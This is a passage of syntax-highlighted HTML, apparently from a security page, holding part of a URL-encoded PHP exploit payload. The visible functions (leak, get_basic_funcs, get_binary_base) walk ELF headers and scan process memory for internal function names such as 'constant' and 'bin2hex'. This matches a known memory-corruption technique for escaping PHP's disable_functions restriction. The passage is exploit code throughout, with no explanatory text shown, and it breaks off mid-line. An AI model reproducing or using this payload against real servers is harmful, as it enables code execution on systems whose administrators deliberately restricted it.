class="hljs-variable">%24</span>base<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">36</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%202</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>e_phnum<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>leak(<span class="hljs-variable">%24</span>base<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">38</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%202</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>for(<span class="hljs-variable">%24</span>i<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%200</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>e_phnum<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i<span class="hljs-variable">%2</span>b<span class="hljs-variable">%2</span>b)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>header<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>base<span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>e_phoff<span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i<span class="hljs-variable">%20</span>*<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>e_phentsize<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>p_type<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>leak(<span class="hljs-variable">%24</span>header<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%204</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>p_flags<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>leak(<span class="hljs-variable">%24</span>header<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%204</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%204</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>p_vaddr<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>leak(<span class="hljs-variable">%24</span>header<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">10</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>p_memsz<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>leak(<span class="hljs-variable">%24</span>header<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">28</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>if(<span class="hljs-variable">%24</span>p_type<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%3</span>d<span class="hljs-variable">%201</span><span class="hljs-variable">%20</span><span class="hljs-variable">%26</span><span class="hljs-variable">%26</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>p_flags<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%3</span>d<span class="hljs-variable">%206</span>)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>data_addr<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>e_type<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%3</span>d<span class="hljs-variable">%202</span><span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>f<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>p_vaddr<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>base<span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>p_vaddr<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>data_size<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>p_memsz<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span>else<span class="hljs-variable">%20</span>if(<span class="hljs-variable">%24</span>p_type<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%3</span>d<span class="hljs-variable">%201</span><span class="hljs-variable">%20</span><span class="hljs-variable">%26</span><span class="hljs-variable">%26</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>p_flags<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%3</span>d<span class="hljs-variable">%205</span>)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>text_size<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>p_memsz<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>if(!<span class="hljs-variable">%24</span>data_addr<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span><span class="hljs-keyword">c</span><span class="hljs-variable">%7</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span>!<span class="hljs-variable">%24</span>text_size<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span><span class="hljs-keyword">c</span><span class="hljs-variable">%7</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span>!<span class="hljs-variable">%24</span>data_size)<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>return<span class="hljs-variable">%20</span><span class="hljs-keyword">false</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>return<span class="hljs-variable">%20</span><span class="hljs-variable">%5</span>b<span class="hljs-variable">%24</span>data_addr<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>text_size<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>data_size<span class="hljs-variable">%5</span>d<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>function<span class="hljs-variable">%20</span>get_basic_funcs(<span class="hljs-variable">%24</span>base<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>elf)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>list(<span class="hljs-variable">%24</span>data_addr<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>text_size<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>data_size)<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>elf<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>for(<span class="hljs-variable">%24</span>i<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%200</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>data_size<span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%208</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i<span class="hljs-variable">%2</span>b<span class="hljs-variable">%2</span>b)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>leak<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>leak(<span class="hljs-variable">%24</span>data_addr<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i<span class="hljs-variable">%20</span>*<span class="hljs-variable">%208</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>if(<span class="hljs-variable">%24</span>leak<span class="hljs-variable">%20</span>-<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>base<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%200</span><span class="hljs-variable">%20</span><span class="hljs-variable">%26</span><span class="hljs-variable">%26</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>leak<span class="hljs-variable">%20</span>-<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>base<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>data_addr<span class="hljs-variable">%20</span>-<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>base)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>deref<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>leak(<span class="hljs-variable">%24</span>leak)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>if(<span class="hljs-variable">%24</span>deref<span class="hljs-variable">%20</span>!<span class="hljs-variable">%3</span>d<span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">746e6174736</span>e<span class="hljs-number">6</span>f<span class="hljs-number">63</span>)<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>continue<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span>else<span class="hljs-variable">%20</span>continue<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>leak<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>leak(<span class="hljs-variable">%24</span>data_addr<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span>(<span class="hljs-variable">%24</span>i<span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%204</span>)<span class="hljs-variable">%20</span>*<span class="hljs-variable">%208</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>if(<span class="hljs-variable">%24</span>leak<span class="hljs-variable">%20</span>-<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>base<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%200</span><span class="hljs-variable">%20</span><span class="hljs-variable">%26</span><span class="hljs-variable">%26</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>leak<span class="hljs-variable">%20</span>-<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>base<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>data_addr<span class="hljs-variable">%20</span>-<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>base)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>deref<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>leak(<span class="hljs-variable">%24</span>leak)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>if(<span class="hljs-variable">%24</span>deref<span class="hljs-variable">%20</span>!<span class="hljs-variable">%3</span>d<span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">786568326e6962</span>)<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>continue<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span>else<span class="hljs-variable">%20</span>continue<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>return<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>data_addr<span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i<span class="hljs-variable">%20</span>*<span class="hljs-variable">%208</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>function<span class="hljs-variable">%20</span>get_binary_base(<span class="hljs-variable">%24</span>binary_leak)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>base<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%200</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>start<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>binary_leak<span class="hljs-variable">%20</span><span class="hljs-variable">%26</span><span class="hljs-variable">%200</span>xfffffffffffff<span class="hljs-number">000</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>for(<span class="hljs-variable">%24</span>i<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%200</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">1000</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i<span class="hljs-variable">%2</span>b<span class="hljs-variable">%2</span>b)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span 